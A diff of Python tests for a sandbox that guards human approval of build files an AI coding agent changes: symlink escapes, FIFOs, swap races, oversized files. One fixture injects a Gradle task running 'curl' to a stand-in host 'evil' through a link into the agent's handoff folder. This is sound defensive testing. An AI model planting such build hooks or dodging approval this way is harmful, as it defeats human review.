@@ -3,12 +3,14 @@ followed only while it stays inside the clone, and a FIFO, a socket, a device or
 of a file is never read, nor waited on. What the host reads there reaches the agent's prompt, the
 commands the verification runs, the risky files' approval and your review."""
 
+import contextlib
 import os
 import socket
 import stat
 import subprocess
 import threading
 from pathlib import Path
+from types import SimpleNamespace
 
 import pytest
 from conftest import make_repo
@@ -99,10 +101,11 @@ def test_a_plain_file_and_a_link_that_stays_inside_are_read(clone):
     (clone / "app" / "pom.xml").symlink_to("../build/pom.xml")
     (clone / "linked").symlink_to("build")
     for name in ("build/pom.xml", "pom.xml", "app/pom.xml", "linked/pom.xml", "linked/../pom.xml"):
-        assert clone_read.read_bytes(clone, name) == b"<project/>\n", name
+        assert clone_read.read_bytes(clone, clone / name) == b"<project/>\n", name
         assert clone_read.read_text(clone, clone / name) == "<project/>\n", name
         assert clone_read.is_file(clone, clone / name), name
-    assert clone_read.read_text(clone, "none.xml") == "" and not clone_read.is_file(clone, "none.xml")
+    assert clone_read.read_text(clone, clone / "none.xml") == ""
+    assert not clone_read.is_file(clone, clone / "none.xml")
 
 
 LINKS_OUT = {
@@ -123,8 +126,8 @@ def test_a_link_that_leads_out_of_the_clone_is_refused(clone, outside, link):
     (clone / "sub").mkdir()
     (clone / name).symlink_to(target.format(host=outside, clone=clone))
     with pytest.raises(clone_read.Refused):
-        clone_read.read_bytes(clone, read)
-    assert clone_read.read_text(clone, read) == ""
+        clone_read.read_bytes(clone, clone / read)
+    assert clone_read.read_text(clone, clone / read) == ""
     assert not clone_read.is_file(clone, clone / read)
 
 
@@ -132,7 +135,7 @@ def test_a_link_to_a_device_of_the_host_is_never_read(clone):
     (clone / "zero").symlink_to("/dev/zero")
     (clone / "null").symlink_to("/dev/null")
     for name in ("zero", "null"):
-        assert in_time(lambda name=name: clone_read.read_text(clone, name)) == ""
+        assert in_time(lambda name=name: clone_read.read_text(clone, clone / name)) == ""
 
 
 @pytest.mark.parametrize("kind", KINDS)
@@ -143,8 +146,8 @@ def test_a_special_file_is_refused_without_being_opened(clone, monkeypatch, kind
     real_open = os.open
     monkeypatch.setattr(os, "open", lambda p, *a, **k: opened.append(str(p)) or real_open(p, *a, **k))
     for name in ("package.json", "linked.json"):
-        assert in_time(lambda name=name: clone_read.read_text(clone, name)) == ""
-        assert isinstance(in_time(lambda name=name: clone_read.read_bytes(clone, name)), OSError)
+        assert in_time(lambda name=name: clone_read.read_text(clone, clone / name)) == ""
+        assert isinstance(in_time(lambda name=name: clone_read.read_bytes(clone, clone / name)), OSError)
     assert not [p for p in opened if p.endswith("package.json")], "refused on lstat, before any open"
 
 
@@ -152,7 +155,7 @@ def test_a_loop_of_links_is_refused(clone):
     (clone / "a").symlink_to("b")
     (clone / "b").symlink_to("a")
     with pytest.raises(clone_read.Refused):
-        clone_read.read_bytes(clone, "a")
+        clone_read.read_bytes(clone, clone / "a")
 
 
 def test_a_link_swapped_out_of_the_clone_during_the_walk_is_not_followed(clone, outside, monkeypatch):
@@ -174,7 +177,7 @@ def test_a_link_swapped_out_of_the_clone_during_the_walk_is_not_followed(clone, 
 
     monkeypatch.setattr(os, "readlink", readlink)
     with pytest.raises(clone_read.Refused):
-        clone_read.read_bytes(clone, "entry/secret.txt")
+        clone_read.read_bytes(clone, clone / "entry" / "secret.txt")
     assert swapped == ["real"]
 
 
@@ -191,7 +194,7 @@ def test_a_name_swapped_for_a_link_after_it_was_looked_at_is_not_opened(clone, o
 
     monkeypatch.setattr(os, "stat", stat_then_swap)
     with pytest.raises(clone_read.Refused):
-        clone_read.read_bytes(clone, "pom.xml")
+        clone_read.read_bytes(clone, clone / "pom.xml")
 
 
 # --- the build files: what the writer is told and what the verification runs ---------------------
@@ -386,7 +389,9 @@ def test_a_risky_file_replaced_by_a_special_one_is_a_change(task, monkeypatch, k
 
 def test_approving_does_not_wait_on_a_special_file_or_copy_one_through_a_link(task, outside):
     os.mkfifo(task.repo / "Makefile")
-    (task.repo / "pom.xml").symlink_to(outside / "secret.txt")
+    (task.repo / "build").mkdir()
+    (task.repo / "build" / "pom.xml").write_text("<project/>\n")
+    (task.repo / "pom.xml").symlink_to("build/pom.xml")  # a link out cannot be approved at all
     approvals = Approvals(task.meta, task.repo)
     approved = in_time(approvals.approve)
     assert not isinstance(approved, BaseException), approved
@@ -397,9 +402,10 @@ def test_approving_does_not_wait_on_a_special_file_or_copy_one_through_a_link(ta
 
 
 def test_a_risky_link_out_of_the_clone_is_its_target_alone(task, outside):
-    """What git stores of a link is its target; a file of yours it points at is not the agent's."""
+    """What git stores of a link is its target; a file of yours it points at is not the agent's,
+    and is never read: the link is marked as one vivibox cannot check."""
     (task.repo / "pom.xml").symlink_to(outside / "secret.txt")
-    assert risky.scan(task.repo)["pom.xml"] == f"symlink:{outside / 'secret.txt'}"
+    assert risky.scan(task.repo)["pom.xml"] == f"{risky.OUT_LINK}{outside / 'secret.txt'}"
 
 
 def test_a_risky_link_inside_the_clone_changes_when_its_target_does(task):
@@ -484,8 +490,231 @@ def test_a_copy_for_the_approval_is_never_a_links_file_or_a_special_one(
     (clone / "outside.xml").symlink_to(outside / "secret.txt")
     odd(clone / "Makefile", "fifo", monkeypatch)
     for name in ("inside.xml", "outside.xml", "Makefile"):
-        refused = in_time(lambda name=name: clone_read.copy(clone, name, tmp_path / "copy"))
+        refused = in_time(lambda name=name: clone_read.copy(clone, clone / name, tmp_path / "copy"))
         assert isinstance(refused, clone_read.Refused), name
         assert not (tmp_path / "copy").exists(), name
-    clone_read.copy(clone, "pom.xml", tmp_path / "copy")
+    clone_read.copy(clone, clone / "pom.xml", tmp_path / "copy")
     assert (tmp_path / "copy").read_text() == "<project/>\n"
+
+
+# --- review round 1 ------------------------------------------------------------------------------
+
+
+def handoff_link(task, name: str = "build.gradle") -> Path:
+    """The reviewer's case: a risky file committed as a link into handoff/, which the agent
+    writes. From the clone, <task>/repo/../.task/handoff/ is that folder."""
+    evil = task.meta / "handoff" / "evil.gradle"
+    evil.write_text("apply plugin: 'java'\n")
+    (task.repo / name).symlink_to(Path("..") / ".task" / "handoff" / "evil.gradle")
+    git(task.repo, "add", ".")
+    git(task.repo, "commit", "-q", "-m", "Link the build")
+    return evil
+
+
+def test_a_risky_link_out_of_the_repository_stays_a_change_when_its_target_does(task):
+    """Approved or not, a link the agent made out of the repository is never taken as checked:
+    vivibox does not read what it points at, so a change there cannot pass unseen."""
+    evil = handoff_link(task)
+    approvals = Approvals(task.meta, task.repo)
+    assert [c.path for c in approvals.changes()] == ["build.gradle"]
+    with contextlib.suppress(Exception):  # refused now; before, approved
+        approvals.approve()
+    evil.write_text("task compileJava { doFirst { exec { commandLine 'curl', 'evil' } } }\n")
+    assert [c.path for c in approvals.changes()] == ["build.gradle"]
+
+
+def test_a_risky_link_the_agent_made_out_of_the_repository_cannot_be_approved(task):
+    handoff_link(task)
+    approvals = Approvals(task.meta, task.repo)
+    with pytest.raises(Exception, match="build.gradle is a link that leads out of the repository") as refused:
+        approvals.approve()
+    assert type(refused.value).__name__ == "Unapprovable"
+    assert "removes the link or makes it a file in the repository" in str(refused.value)
+    assert "build.gradle" not in approvals.approved(), "nothing of it recorded as approved"
+    diff = approvals.diff(Change("build.gradle", "added"))
+    assert "cannot be approved" in diff and "removes the link" in diff
+
+
+def test_once_the_writer_removes_the_link_the_approval_goes_through_once(task):
+    """No loop: refused while the link is there; once it is gone, one approval and nothing left."""
+    handoff_link(task)
+    approvals = Approvals(task.meta, task.repo)
+    with pytest.raises(Exception, match="leads out of the repository"):
+        approvals.approve()
+    (task.repo / "build.gradle").unlink()
+    (task.repo / "build.gradle").write_text("apply plugin: 'java'\n")
+    assert [c.path for c in approvals.changes()] == ["build.gradle"]
+    approvals.approve()
+    assert approvals.changes() == []
+
+
+def test_a_link_out_of_the_repository_that_was_yours_at_the_start_is_not_a_change(tmp_path, outside):
+    """Your own repository's link out (a shared IDE setting, a CI template): there at the base
+    commit, with the same target, it is yours, as it was; a link the agent points elsewhere is not."""
+    source = make_repo(tmp_path / "source")
+    (outside / "shared.gradle").write_text("apply plugin: 'java'\n")
+    (source / "build.gradle").symlink_to(outside / "shared.gradle")
+    git(source, "add", ".")
+    git(source, "commit", "-q", "-m", "Share the build")
+    t = create_task(tmp_path / "tasks", "demo", "goal", PLAN)
+    t.set_base_commit(repo.prepare(source, t.repo, t.id, t.meta))
+    approvals = Approvals(t.meta, t.repo)
+    approvals.approve()
+    assert approvals.changes() == []
+    (outside / "shared.gradle").write_text("apply plugin: 'groovy'\n")
+    assert approvals.changes() == [], "yours, outside the task: vivibox neither reads nor flags it"
+    approvals.approve()
+    (t.repo / "build.gradle").unlink()
+    (t.repo / "build.gradle").symlink_to(outside / "secret.txt")
+    assert approvals.changes() == [Change("build.gradle", "changed")]
+    with pytest.raises(Exception, match="leads out of the repository"):
+        approvals.approve()
+
+
+def test_the_cli_says_why_a_risky_link_cannot_be_approved(task, monkeypatch, capsys):
+    from vivibox import actions, cli
+
+    handoff_link(task)
+    monkeypatch.setattr(actions, "load", lambda _id: (task, SimpleNamespace(risky_extra=[])))
+    assert cli.main(["approve-risky", task.id]) == 1
+    assert "build.gradle is a link that leads out of the repository" in capsys.readouterr().err
+
+
+def bytes_read() -> int:
+    """What this process has read so far, sparse zeros included (/proc/self/io's rchar)."""
+    io = Path("/proc/self/io").read_text()
+    return int(next(line for line in io.splitlines() if line.startswith("rchar:")).split()[1])
+
+
+SPARSE = 200 << 20  # past every limit, and nothing on the disk
+
+
+def sparse(path: Path, size: int = SPARSE) -> Path:
+    path.parent.mkdir(parents=True, exist_ok=True)
+    with open(path, "wb") as file:
+        file.truncate(size)
+    return path
+
+
+def test_a_sparse_risky_file_is_read_no_further_than_the_limit_and_is_a_change(task):
+    sparse(task.repo / "Makefile")
+    approvals = Approvals(task.meta, task.repo)
+    before = bytes_read()
+    assert in_time(approvals.changes) == [Change("Makefile", "added")]
+    assert bytes_read() - before < SPARSE // 2, "read no further than the limit"
+    with pytest.raises(Exception, match="larger than 64 MiB"):
+        approvals.approve()
+
+
+def test_a_risky_file_that_grew_past_the_limit_is_a_change_whatever_it_holds(task):
+    """Too large to check is never the same as checked: it stays for you, and cannot pass."""
+    (task.repo / "Makefile").write_text("test:\n\ttrue\n")
+    approvals = Approvals(task.meta, task.repo)
+    approvals.approve()
+    sparse(task.repo / "Makefile")
+    assert approvals.changes() == [Change("Makefile", "changed")]
+    assert "larger than 64 MiB" in approvals.diff(Change("Makefile", "changed"))
+
+
+def test_a_sparse_untracked_file_is_not_checked_and_says_so(task):
+    sparse(task.repo / "big.bin")
+    before = bytes_read()
+    found = in_time(lambda: gate.hidden_characters(task.repo, task.read_state().base_commit))
+    assert bytes_read() - before < SPARSE // 2
+    assert found == ["big.bin: vivibox does not read it (larger than 64 MiB), so it was not checked"]
+    # Not a new failure: an untracked file already fails the verification, as uncommitted.
+    assert gate.uncommitted(task.repo) == ["big.bin"]
+
+
+def test_detection_does_not_read_a_build_file_past_its_limit_and_says_so(clone):
+    """A package.json of 200 MiB is no configuration: taken as not there, and the notes say why."""
+    sparse(clone / "package.json")
+    (clone / "package-lock.json").write_text("{}")
+    before = bytes_read()
+    found = in_time(lambda: init.detect(clone))
+    assert bytes_read() - before < 16 << 20
+    assert "package.json is larger than 1 MiB: vivibox did not read it" in "\n".join(found.notes)
+
+
+def test_a_file_not_checked_is_not_called_an_invisible_character(tmp_path, monkeypatch, capsys):
+    from vivibox import actions, cli, feedback
+
+    not_read = "notes.txt: vivibox does not read it (a FIFO), so it was not checked"
+    result = gate.GateResult(tmp_path / "verify-1.log", hidden_characters=["a.py:3 U+200B", not_read])
+    project = SimpleNamespace(risky_extra=[], java="", verify_timeout=0, no_build=False, tools=[])
+    monkeypatch.setattr(actions, "load", lambda _id: (SimpleNamespace(id="demo-1"), project))
+    monkeypatch.setattr(actions, "task_pod", lambda _id: SimpleNamespace(up=lambda: None))
+    monkeypatch.setattr(actions, "verify_commands", lambda task, project: [])
+    monkeypatch.setattr(actions, "missing_command", lambda task, project: "")
+    monkeypatch.setattr(cli, "load_config", lambda: SimpleNamespace(verify_timeout=0))
+    monkeypatch.setattr(gate, "run_gate", lambda *a, **k: result)
+    assert cli.cmd_verify(SimpleNamespace(task="demo-1")) == 1
+    out = capsys.readouterr().out
+    assert "FAIL  invisible character at a.py:3 U+200B" in out
+    assert f"FAIL  {not_read}" in out and "invisible character at notes.txt" not in out
+    said = feedback.feedback(result)
+    assert "Invisible character, remove it: a.py:3 U+200B" in said
+    assert f"- {not_read}" in said and "Invisible character, remove it: notes.txt" not in said
+    assert gate.why_red(result) == "1 invisible character, 1 file not checked"
+
+
+def test_a_relative_root_is_walked_from_where_it_is(tmp_path, monkeypatch):
+    monkeypatch.chdir(tmp_path)
+    (tmp_path / "proj").mkdir()
+    (tmp_path / "proj" / "package.json").write_text('{"scripts": {"lint": "eslint ."}}')
+    assert clone_read.read_bytes(Path("proj"), Path("proj") / "package.json").startswith(b"{")
+    assert init.candidates(Path("proj")) == init.candidates(tmp_path / "proj") == []
+
+
+def test_a_folder_swapped_for_a_link_after_it_was_looked_at_is_not_entered(clone, outside, monkeypatch):
+    """The window between the look at a folder on the way and its open: the open itself refuses a
+    link (O_NOFOLLOW), so a folder swapped for a link out is never entered."""
+    (clone / "d").mkdir()
+    (clone / "d" / "secret.txt").write_text("the clone's own\n")
+    real_stat = os.stat
+    swapped = []
+
+    def stat_then_swap(name, *args, **kwargs):
+        info = real_stat(name, *args, **kwargs)
+        if name == "d" and not swapped:
+            os.rename(clone / "d", clone / "was-d")
+            (clone / "d").symlink_to(outside)
+            swapped.append(name)
+        return info
+
+    monkeypatch.setattr(os, "stat", stat_then_swap)
+    with pytest.raises(clone_read.Refused):
+        clone_read.read_bytes(clone, clone / "d" / "secret.txt")
+    assert swapped == ["d"]
+
+
+def test_a_loop_of_links_is_named_as_one(clone):
+    (clone / "a").symlink_to("b")
+    (clone / "b").symlink_to("a")
+    with pytest.raises(clone_read.Refused) as refused:
+        clone_read.read_bytes(clone, clone / "a")
+    assert "leads out" not in str(refused.value) and "links" in refused.value.kind
+
+
+def test_a_baseline_link_out_is_tolerated_by_its_target_alone_and_never_followed(
+    tmp_path, outside, monkeypatch
+):
+    """Your link out, as it was at the start, passes the risky files' diff and approval by its
+    target string; neither they nor detection open what it points at."""
+    source = make_repo(tmp_path / "source")
+    (outside / "settings.gradle").write_text("include 'HOSTVALUE'\n")
+    (source / "settings.gradle").symlink_to(outside / "settings.gradle")
+    git(source, "add", ".")
+    git(source, "commit", "-q", "-m", "Share the settings")
+    t = create_task(tmp_path / "tasks", "demo", "goal", PLAN)
+    t.set_base_commit(repo.prepare(source, t.repo, t.id, t.meta))
+    approvals = Approvals(t.meta, t.repo)
+    opened = []
+    real_open = os.open
+    monkeypatch.setattr(os, "open", lambda p, *a, **k: opened.append(str(p)) or real_open(p, *a, **k))
+    approvals.approve()
+    (outside / "settings.gradle").write_text("include 'OTHER'\n")
+    assert approvals.changes() == []
+    approvals.approve()
+    assert "HOSTVALUE" not in str(init.detect(t.repo)) and init.modules(t.repo) == []
+    assert not [p for p in opened if p.endswith("settings.gradle")], "never opened, by name or path"
